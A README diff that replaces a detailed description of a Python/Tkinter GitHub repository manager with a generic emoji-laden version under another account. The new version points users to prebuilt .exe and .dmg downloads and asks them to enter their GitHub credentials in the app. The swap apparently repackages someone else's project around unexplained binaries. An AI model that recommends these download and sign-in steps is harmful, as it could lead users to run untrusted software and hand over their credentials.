@@ -1,237 +1,54 @@
-# GitHub Repository Manager
+# 🎉 github-repo-manager - Simplify Your GitHub Management
 
-A comprehensive desktop application for managing all your GitHub repositories in one place. Built with Python and Tkinter, this tool provides a powerful interface to view, filter, and manage your entire GitHub portfolio.
+## 🚀 Getting Started
+Welcome to github-repo-manager! This is your go-to application for managing all your GitHub repositories easily and effectively. With our advanced filtering, bulk operations, and user-friendly interface, you can control your projects with confidence.
 
-![GitHub Repository Manager](https://img.shields.io/badge/python-3.7%2B-blue) ![License](https://img.shields.io/badge/license-MIT-green) ![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20macOS%20%7C%20Windows-lightgrey)
+## 📥 Download the Application
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Chiragkhan/github-repo-manager/releases)
 
-## Features
+You can download the latest version of github-repo-manager from our Releases page. Access it here: [Download Page](https://github.com/Chiragkhan/github-repo-manager/releases).
 
-### 📊 **Repository Overview**
-- **Complete Repository List** - View all your repositories in a sortable table
-- **Real-time Statistics** - See totals for repos, stars, forks, and more
-- **Status Indicators** - Visual status showing activity level (🔥 Hot, 📝 Active, ⚠️ Inactive, 😴 Stale, 🗄️ Archived)
-- **Visual Repository Types** - Color-coded rows for private, archived, and forked repositories
+## 📦 System Requirements
+Before you start, make sure your system meets the following requirements:
 
-### 🔍 **Advanced Filtering & Search**
-- **Visibility Filter** - Show All, Public only, or Private only repositories
-- **Language Filter** - Filter by programming language
-- **Text Search** - Real-time search across repository names
-- **Smart Sorting** - Click column headers to sort by any attribute
+- **Operating System:** Windows 10 or later, macOS Mojave or later
+- **Python:** Python 3.7 or higher installed on your system (if not bundled)
+- **RAM:** At least 4 GB of RAM
+- **Storage:** 200 MB of free disk space
 
-### ⚙️ **Repository Management**
-- **Bulk Operations** - Select multiple repositories for batch actions
-- **Quick Access** - Double-click to open repositories in browser
-- **Clone Management** - Clone single or multiple repositories locally
-- **License Updates** - Update licenses across multiple repositories
-- **Bulk Settings** - Apply settings to multiple repositories at once
+## 🔧 Features
+- **Repository Management:** Easily view and manage all your GitHub repositories.
+- **Bulk Operations:** Perform actions on multiple repositories at once, saving you time.
+- **Advanced Filtering:** Sort and filter your repositories based on various criteria, helping you find what you need quickly.
+- **Intuitive GUI:** Navigate through the application with a simple, user-friendly interface.
+- **Cross-Platform Support:** Available for both Windows and macOS users.
 
-### 🖱️ **Intuitive Interface**
-- **Context Menus** - Right-click for repository-specific actions
-- **Keyboard Shortcuts** - Efficient navigation and selection
-- **Progress Tracking** - Visual progress bars for long-running operations
-- **Status Updates** - Real-time status messages and feedback
+## 🔄 How to Download & Install
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Chiragkhan/github-repo-manager/releases). This is where you will find all available versions of the application.
+2. **Choose the Version:** Look for the latest version of github-repo-manager. You will see listings with different files for download.
+3. **Download the File:** Click on the appropriate file for your operating system (e.g., `github-repo-manager.exe` for Windows or `github-repo-manager.dmg` for macOS).
+4. **Run the Installer:** Locate the downloaded file on your computer and double-click to run it. Follow the prompts to complete the installation.
 
-## Installation
+## 📘 User Guide
+Once the installation completes, launch the application. You will find options to connect to your GitHub account. Follow these steps:
 
-### Prerequisites
+1. **Sign In:** Enter your GitHub credentials within the app to link your repositories.
+2. **Explore Your Repositories:** Navigate through your repositories with the intuitive menu on the left side.
+3. **Use Bulk Actions:** Select multiple repositories to perform actions like delete, clone, or update in one go.
+4. **Utilize the Filters:** Use the filtering options to find specific repositories quickly.
 
-- Python 3.7 or higher
-- `pass` password manager (for GitHub token storage)
-- Git (for cloning functionality)
+## 🛠️ Troubleshooting
+If you encounter issues, consider the following:
 
-### Install Dependencies
+- **Check System Requirements:** Ensure your system meets all requirements listed above.
+- **Restart the Application:** Sometimes, restarting the app can resolve temporary issues.
+- **Reinstall the App:** If problems persist, uninstall and reinstall the application.
+- **Visit our Support Page:** For detailed guides and FAQs, visit the support section on our GitHub page.
 
-```bash
-pip install -r requirements.txt
-```
+## 📞 Get Help
+Need further assistance? Feel free to reach out through the [GitHub Issues page](https://github.com/Chiragkhan/github-repo-manager/issues). We welcome any questions or feedback.
 
-### Setup GitHub Token
+## 🌐 Connect with Us
+Stay updated on new features and improvements by following us on our social media channels and checking back for updates on our GitHub page.
 
-Store your GitHub personal access token in pass:
-
-```bash
-pass insert github/token
-```
-
-Enter your GitHub personal access token when prompted. You can create one at:
-https://github.com/settings/tokens
-
-**Required token permissions:**
-- `repo` - Full repository access
-- `admin:org` - Organization access (if managing org repos)
-
-## Usage
-
-### Starting the Application
-
-```bash
-python3 github_repo_manager.py
-```
-
-Or make it executable:
-
-```bash
-chmod +x github_repo_manager.py
-./github_repo_manager.py
-```
-
-### Main Interface
-
-The application window consists of several key areas:
-
-1. **Control Panel (Left)** - Buttons, filters, and statistics
-2. **Repository Table (Center)** - Main data display with sortable columns
-3. **Status Bar (Bottom)** - Progress and status information
-
-### Repository Table Columns
-
-| Column | Description |
-|--------|-------------|
-| ☐ | Selection checkbox |
-| Repository Name | Name and link to repository |
-| Visibility | 🔒 Private or 🌐 Public |
-| Language | Primary programming language |
-| ⭐ | Star count |
-| 🍴 | Fork count |
-| 📋 | Open issues count |
-| License | Repository license type |
-| Size (KB) | Repository size |
-| Last Updated | Date of last commit |
-| Status | Activity status indicator |
-| Actions | Quick action menu |
-
-### Key Operations
-
-#### Selecting Repositories
-- **Single Selection**: Click the checkbox in the first column
-- **Multiple Selection**: Click multiple checkboxes
-- **Select All**: (Feature to be implemented)
-
-#### Repository Actions
-- **Open in Browser**: Double-click or use "Open in Browser" button
-- **Clone Repository**: Right-click → Clone or use "Clone Selected" button
-- **View Settings**: Right-click → Repository Settings
-
-#### Filtering & Search
-- **Visibility**: Use dropdown to show All/Public/Private repositories
-- **Language**: Filter by specific programming language
-- **Search**: Type in search box to filter by repository name
-
-#### Bulk Operations
-- Select multiple repositories using checkboxes
-- Use bulk action buttons: Open, Clone, Update License, Bulk Settings
-
-## Configuration
-
-### GitHub Token Permissions
-
-Your GitHub token needs the following scopes:
-- `repo` - Access to repositories
-- `admin:org` - Organization access (optional)
-
-### Default Settings
-
-- **Clone Directory**: `~/git` (customizable per operation)
-- **Refresh Interval**: Manual refresh only
-- **GitHub API**: Uses GitHub REST API v3
-
-## Features in Detail
-
-### Repository Status Indicators
-
-- **🔥 Hot** - Updated within 30 days
-- **📝 Active** - Updated 30-180 days ago  
-- **⚠️ Inactive** - Updated 180-365 days ago
-- **😴 Stale** - Updated over 365 days ago
-- **🗄️ Archived** - Repository is archived
-
-### Row Color Coding
-
-- **Yellow Background** - Private repositories
-- **Red Background** - Archived repositories  
-- **Green Background** - Forked repositories
-- **Blue Background** - Selected repositories
-
-### Statistics Panel
-
-Real-time statistics showing:
-- Total repositories (filtered)
-- Public/Private count
-- Total stars across all repos
-- Total forks across all repos
-
-## Troubleshooting
-
-### Common Issues
-
-**"Failed to get GitHub token from pass store"**
-- Ensure `pass` is installed and configured
-- Store your GitHub token: `pass insert github/token`
-
-**"Failed to load repositories"**
-- Check your internet connection
-- Verify your GitHub token has correct permissions
-- Check if you've hit GitHub API rate limits
-
-**Repositories not loading**
-- Click the "🔄 Refresh" button to reload
-- Check the status bar for error messages
-
-### GitHub API Rate Limits
-
-- **Authenticated requests**: 5,000 per hour
-- **Search API**: 30 requests per minute
-- The app shows progress bars for rate limit awareness
-
-## Development
-
-### Project Structure
-
-```
-github-repo-manager/
-├── github_repo_manager.py    # Main application
-├── requirements.txt          # Python dependencies
-├── README.md                # This file
-├── LICENSE                  # MIT License
-└── .gitignore              # Git ignore rules
-```
-
-### Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Test thoroughly
-5. Submit a pull request
-
-### Future Enhancements
-
-- [ ] Repository creation and deletion
-- [ ] Issue and pull request management
-- [ ] Branch management interface
-- [ ] Repository templates
-- [ ] Export/import repository lists
-- [ ] Automated license updates
-- [ ] Repository health scoring
-- [ ] Integration with other Git providers
-
-## Security Considerations
-
-- GitHub token is stored securely in pass
-- No tokens are logged or displayed in the UI
-- All API calls use HTTPS
-- Local repository data is cached in memory only
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Author
-
-**Philip S Wright** - [GitHub Profile](https://github.com/pdubbbbbs)
-
-## Acknowledgments
-
-- GitHub REST API for repository data
-- Python Tkinter for the GUI framework
-- Pass password manager for secure token storage
+Thank you for choosing github-repo-manager! Enjoy managing your repositories with ease.
